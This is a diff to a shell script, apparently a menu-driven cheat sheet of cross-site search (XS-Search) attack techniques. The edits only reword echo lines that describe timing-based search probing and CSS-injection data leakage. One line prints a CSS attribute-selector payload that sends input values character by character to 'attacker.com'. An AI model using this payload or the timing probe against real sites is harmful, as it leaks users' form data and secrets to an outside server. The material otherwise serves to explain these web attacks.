@@ -20,7 +20,7 @@ case $xs_opt in
     1)
         echo -e "\n${C2}[*] Timing-Based XS-Search:${NC}"
         echo "Goal: Determine if a search query has results based on how long the server takes to respond."
-        echo "Method: Use 'performance.now()' in JS to measure the time it takes to load a search URL in a background tag (img/script)."
+        echo "Method: Use 'performance.now()' in JS to measure the time it takes to load a search URL in a background tag."
         echo "Example: If 'search?q=admin' takes 500ms and 'search?q=xyz' takes 100ms, 'admin' likely exists."
         ;;
     2)
@@ -42,9 +42,9 @@ case $xs_opt in
         ;;
     5)
         echo -e "\n${C2}[*] CSS Injection Search:${NC}"
-        echo "If you have limited CSS injection, use attribute selectors to leak data:"
+        echo "If you have limited CSS injection, use attribute selectors to leak data character by character:"
         echo "Payload: input[value^='a'] { background: url('//attacker.com/leak/a'); }"
-        echo "This leaks the value character by character as the background is loaded."
+        echo "Each match triggers a request to the attacker's server."
         ;;
     *) return ;;
 esac
